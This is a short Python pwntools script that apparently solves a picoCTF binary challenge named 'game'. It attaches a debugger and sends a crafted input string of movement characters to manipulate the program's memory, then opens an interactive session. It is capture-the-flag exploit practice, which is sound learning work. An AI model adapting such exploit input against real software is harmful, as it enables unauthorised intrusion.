import os
from pwn import *

local = True
host,port = 'nc saturn.picoctf.net', 60544
fname = './game'
r = process(fname) if local else remote(host, port)

print(r.recvuntil(b'X\n'))
gdb.attach(r,'''
''')
r.sendline(b'l]aaaa'+b'd'*51+b'w'*5)

r.interactive()


